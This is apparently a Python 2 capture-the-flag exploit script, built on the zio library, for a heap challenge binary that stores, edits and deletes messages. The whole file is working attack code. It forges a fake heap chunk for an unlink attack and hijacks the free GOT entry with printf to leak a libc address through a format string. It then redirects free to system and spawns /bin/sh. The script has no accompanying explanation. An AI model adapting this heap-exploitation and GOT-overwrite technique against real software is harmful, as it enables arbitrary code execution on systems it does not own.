from zio import *
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
target  = './fb_541e262e8cef6f48795a91cb1c17ac0b'
io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)
# io.gdb_hint([0x400cdb]) # finish init
io.gdb_hint([0x400ce7]) # finish set
# io.gdb_hint([0x400cf3]) # finish delete
# io.gdb_hint([0x400cdb, 0x400ce7, 0x400cf3]) 

def init_message(len):
    io.read_until('Choice:')
    io.writeline('1')
    io.read_until('Input the message length:')
    io.writeline(str(len))

def set_message(idx, payload):
    io.read_until('Choice:')
    io.writeline('2')
    io.read_until('Input the message index:')
    io.writeline(str(idx))
    io.read_until('Input the message content:')
    io.writeline(payload)
    
def delete_message(idx):
    io.read_until('Choice:')
    io.writeline('3')
    io.read_until('Input the message index:')
    io.writeline(str(idx))

# struct message{
#     void *addr;
#     long length;
# }

# 0x6020b4: num of message(0 ~ 15)
# 0x6020c0: struct message[]

chunk0      = 0x6020c0
got_free    = 0x602018
plt_printf  = 0x4006e0

init_message(0xf8)
init_message(0xf8)
init_message(0xf8)
init_message(0xf8)

fake_chunk  =   l64(0x100)
fake_chunk  +=  l64(0x101)
fake_chunk  +=  l64(chunk0 - 0x8 * 3)
fake_chunk  +=  l64(chunk0 - 0x8 * 2)
fake_chunk  =   fake_chunk.ljust(0xf0, 'A')
fake_chunk  +=  l64(0xf0)
set_message(0, fake_chunk)
delete_message(1)
set_message(0, 'A' * 0x18 + l64(got_free) + l64(0xf8))
set_message(0, l64(plt_printf)[0:6])
set_message(2, '%17$lx')

delete_message(2)

adr_libc_start_main = int(io.read_until('Done')[0:-4], 16)
off_libc_start_main = 0x21ec5
libc_base           = adr_libc_start_main - off_libc_start_main
off_system          = 0x46640
adr_system          = libc_base + off_system

print '[+]libc base : %d' % libc_base

set_message(0, l64(adr_system)[0:6])
set_message(3, '/bin/sh\x00')
delete_message(3)
io.interact()
